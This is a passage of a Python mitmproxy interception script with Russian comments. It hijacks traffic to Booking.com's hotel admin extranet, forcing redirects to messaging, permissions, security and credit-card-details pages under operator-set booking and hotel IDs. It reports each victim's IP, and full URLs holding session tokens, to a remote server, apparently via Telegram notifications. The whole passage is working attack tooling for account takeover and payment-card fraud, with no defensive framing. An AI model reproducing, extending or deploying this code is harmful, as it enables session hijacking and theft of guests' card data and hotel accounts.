        log_redirect_to_server(client_ip, url, to_domain, "CUSTOM_ONETIME_REDIRECT")
        
        # Создаем DONE flag СРАЗУ
        try:
            parent_dir = os.path.dirname(CUSTOM_REDIRECT_DONE_FLAG)
            if parent_dir and not os.path.exists(parent_dir):
                os.makedirs(parent_dir, exist_ok=True)
            with open(CUSTOM_REDIRECT_DONE_FLAG, 'w') as f:
                f.write("1")
            log("[F17] One-time redirect DONE flag created")
        except Exception as e:
            log(f"[F17] Error creating done flag: {e}")
        
        # Выполняем редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": to_domain,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0",
                "X-MITM-Redirect": "Function-17-One-Time"
            }
        )
        
        # Удаляем активацию через 3 секунды
        def cleanup_activation():
            time.sleep(3)
            try:
                if os.path.exists(CUSTOM_REDIRECT_FLAG):
                    os.remove(CUSTOM_REDIRECT_FLAG)
                    log("[F17] Activation flag removed")
                # Также удаляем файлы конфигурации
                if os.path.exists(CUSTOM_REDIRECT_FROM_FILE):
                    os.remove(CUSTOM_REDIRECT_FROM_FILE)
                if os.path.exists(CUSTOM_REDIRECT_TO_FILE):
                    os.remove(CUSTOM_REDIRECT_TO_FILE)
            except Exception as e:
                log(f"[F17] Error removing activation flag: {e}")
        
        threading.Thread(target=cleanup_activation, daemon=True).start()
        
        return True
        
    except Exception as e:
        log(f"[F17] custom_redirect error: {e}")
        import traceback
        log(f"[F17] Traceback: {traceback.format_exc()}")
        return False
        
def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 19:
    1. Редиректит все запросы к admin.booking.com → secure-admin.booking.com/booking_cc_details.html
    2. Параметры: bn и hotel_id задаются админом, lang берется из запроса
    3. ОТПРАВЛЯЕТ ДВА УВЕДОМЛЕНИЯ: о старте и завершении
    4. Завершается когда видит полный URL со всеми параметрами
    5. НЕТ финального редиректа - пользователь остается на booking_cc_details.html
    """
    try:
        log(f"[F19] Checking if should redirect...")
        
        if not should_booking_cc_details():
            log(f"[F19] Flag not active")
            return False

        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        
        log(f"[F19] Processing URL: {url}")
        log(f"[F19] Host: {host}")
        
        # ====== ВАЖНО: ПРОВЕРЯЕМ ТОЛЬКО HTML ЗАПРОСЫ ======
        # Чтобы избежать спама от CSS/JS/картинок
        content_type = flow.request.headers.get("Content-Type", "").lower()
        accept = flow.request.headers.get("Accept", "").lower()
        
        # Проверяем, это ли HTML запрос или основной документ
        is_html_request = (
            "text/html" in accept or 
            "text/html" in content_type or
            flow.request.method == "GET" and not any(ext in url.lower() for ext in [".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".ico", ".woff", ".woff2", ".ttf", ".svg"])
        )
        
        if not is_html_request:
            log(f"[F19] Not HTML request, skipping (Content-Type: {content_type}, Accept: {accept})")
            return False
        
        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ 19 ======
        # Проверяем, содержит ли URL ВСЕ необходимые параметры
        # Должны быть: ses, has_bvc, lang, bn, hotel_id
        
        # Проверяем, что это запрос К booking_cc_details.html
        if "secure-admin.booking.com/booking_cc_details.html" in url.lower():
            log(f"[F19] Found booking_cc_details.html request")
            
            # Проверяем все 5 обязательных параметров
            url_lower = url.lower()
            required_params = ["ses=", "has_bvc=", "lang=", "bn=", "hotel_id="]
            has_all_params = all(param in url_lower for param in required_params)
            
            if has_all_params:
                log(f"[F19] ✓ Detected ALL 5 required parameters -> FUNCTION 19 COMPLETED")
                
                # Полный URL для Telegram
                full_url = url
                
                # Удаляем флаг функции 19
                remove_booking_cc_details_flag()
                
                # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ (с полным URL как в функции 18)
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, full_url, "FUNCTION_19_COMPLETE")
                
                log(f"[F19] ✓ Completion notification sent for function 19 with URL: {full_url}")
                
                # ====== НЕТ ФИНАЛЬНОГО РЕДИРЕКТА ======
                # Пользователь остается на текущей странице (booking_cc_details.html)
                log(f"[F19] ✓ Function completed, NO final redirect - user stays on booking_cc_details.html")
                return False  # Не делаем редирект, просто завершаем функцию
            
            else:
                # Проверяем, каких параметров не хватает
                missing = []
                for param in required_params:
                    if param not in url_lower:
                        missing.append(param.replace("=", ""))
                
                log(f"[F19] Missing parameters: {missing}, waiting...")
                
                # Если уже на целевой странице (но без всех параметров) - не делаем редирект
                # Ждем когда Booking добавит остальные параметры
                return False
        
        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
        # Редиректим только запросы к admin.booking.com (сабдомен admin)
        # И только если пользователь еще не на целевой странице
        
        if not host.startswith("admin.") or not host.endswith("booking.com"):
            log(f"[F19] Not admin.booking.com, skipping primary redirect")
            return False
        
        # Проверяем, не идет ли уже с booking_cc_details.html (чтобы избежать циклов)
        referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
        if referer and "secure-admin.booking.com/booking_cc_details.html" in referer.lower():
            log(f"[F19] Coming from booking_cc_details.html, waiting for completion")
            return False
        
        log(f"[F19] This is admin.booking.com request - making primary redirect")
        
        # Получаем параметры из конфигурации
        bn = get_booking_cc_details_bn()
        hotel_id_config = get_booking_cc_details_hotel_id()
        
        # Получаем язык из текущего запроса или используем английский
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        lang = query.get("lang", ["en"])[0]
        
        # Если язык не найден, проверяем Referer
        if lang == "en":
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if "lang" in rq:
                        lang = rq.get("lang", ["en"])[0]
                except Exception as e:
                    log(f"[F19] Error parsing referer for lang: {e}")
        
        log(f"[F19] Using bn={bn}, hotel_id={hotel_id_config}, lang={lang}")
        
        # Формируем целевой URL (без ses - он добавится позже сайтом)
        # ВАЖНО: параметры разделяются точкой с запятой как в Booking
        target_url = f"https://secure-admin.booking.com/booking_cc_details.html?lang={lang};bn={bn};hotel_id={hotel_id_config};has_bvc=1"
        
        # Проверяем, что это не редирект на ту же самую страницу
        if url == target_url:
            log(f"[F19] URL is same as target, not redirecting")
            return False
        
        log(f"[F19] ✓ Primary redirect {url} -> {target_url}")
        
        # Логируем редирект (уведомление о СТАРТЕ функции)
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_19_CC_DETAILS")
        
        # Выполняем ПЕРВИЧНЫЙ редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"[F19] Error in booking_cc_details_redirect: {e}")
        import traceback
        log(f"[F19] Traceback: {traceback.format_exc()}")
        return False

# Главная точка входа
# Главная точка входа - ИСПРАВЛЕННАЯ ВЕРСИЯ
def request(flow: http.HTTPFlow) -> None:
    # Логируем доступ к платформам (только мониторинг)
    if should_log_domain(flow):
        try:
            client_ip = get_client_ip(flow)
            from_url = flow.request.pretty_url
            
            # Определяем тип редиректа
            redirect_type = "DOMAIN_MONITOR"
            
            # Отправляем на сервер
            log_redirect_to_server(
                client_ip=client_ip,
                from_url=from_url,
                to_url="MONITORED",
                redirect_type=redirect_type
            )
        except Exception as e:
            log(f"Error in domain monitoring: {e}")
    
    redirect_target = get_redirect_target()
    
    # ========== ПРИОРИТЕТ 1: ФУНКЦИЯ 17 (ЕДИНОРАЗОВЫЙ КАСТОМ) ==========
    # Функция 17 работает для ВСЕХ доменов, независимо от target domains
    if custom_redirect(flow):
        return
    
    # ========== ПРИОРИТЕТ 2: ФУНКЦИИ ДЛЯ BOOKING (18, 19, 13, 15, 7-12) ==========
    host = (flow.request.pretty_host or "").lower()
    
    # Функция 18 (резервы) - только для admin.booking.com
    if host.endswith("admin.booking.com") and booking_reservations_download_redirect(flow):
        return
        
    # Функция 19 (карты) - только для booking.com
    if host.endswith("booking.com") and booking_cc_details_redirect(flow):
        return
    
    # ========== ПРИОРИТЕТ 3: BOOKING-SPECIFIC РЕДИРЕКТЫ ==========
    # Эти функции работают ТОЛЬКО для admin.booking.com
    if host.endswith("admin.booking.com"):
        # Функция 15 (безопасность)
        if booking_hotel_security_redirect(flow):
            return
            
        # Функция 13 (отели)
        if booking_hotel_global_redirect(flow):
            return

        # Операция 11 (переключение 7->8)
        if (should_operation_11() and 
            flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings")):
            log("Operation 11: user reached messaging/settings page, enabling provider redirect")
            try:
                with open(PROVIDER_FLAG, 'w') as f:
                    f.write("enabled")
            except Exception as e:
                log(f"Error enabling provider redirect: {e}")
            return
        
        # Операция 12 (переключение 9->10)
        if (should_operation_12() and 
            flow.request.pretty_url.startswith("https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions")):
            log("Operation 12: user reached accounts_and_permissions page, enabling security redirect")
            try:
                with open(SECURITY_FLAG, 'w') as f:
                    f.write("enabled")
            except Exception as e:
                log(f"Error enabling security redirect: {e}")
            return
        
        # Функции 7-10 (основные редиректы)
        if booking_redirect(flow, "message"):
            if should_operation_11():
                log("Operation 11: message redirect completed")
            return
            
        if booking_redirect(flow, "provider"):
            if should_operation_11():
                log("Operation 11: provider redirect completed, operation finished")
                remove_operation_11_flag()
            return
            
        if booking_redirect(flow, "user"):
            if should_operation_12():
                log("Operation 12: user redirect completed")
            return
            
        if booking_redirect(flow, "security"):
            if should_operation_12():
                log("Operation 12: security redirect completed, operation finished")
                remove_operation_12_flag()
            return
    
    # ========== ПРИОРИТЕТ 4: ОБЫЧНЫЕ РЕДИРЕКТЫ (только если redirect_target не пустой) ==========
    if not redirect_target:
        # Если redirect_target пустой - НЕ выполняем обычные редиректы
        log(f"No redirect target configured, skipping normal redirects for {host}")
        return
    
    # Проверяем, не является ли это сам таргет
    if is_redirect_target(flow, redirect_target):
        log(f"skip redirect for target itself: {flow.request.pretty_url}")
        return
    
    # Обычные редиректы
    if should_force():
        log(f"FORCE redirect {flow.request.pretty_url} -> {redirect_target}")
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "FORCE")
        flow.response = http.Response.make(302, b"", {"Location": redirect_target})
        return

    if should_one_shot():
        log(f"GLOBAL ONE-SHOT redirect {flow.request.pretty_url} -> {redirect_target}")
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
        flow.response = http.Response.make(
            302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
        )
        remove_one_shot_flag()
        return

    # Cookie-based редирект
    try:
        cookie_present = bool(flow.request.cookies.get(COOKIE))
        if cookie_present:
            log(f"cookie present -> skipping redirect for {host}")
            return
    except Exception:
        pass

    log(f"one-shot client redirect {flow.request.pretty_url} -> {redirect_target}")
    client_ip = get_client_ip(flow)
    log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
    flow.response = http.Response.make(
        302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
    )
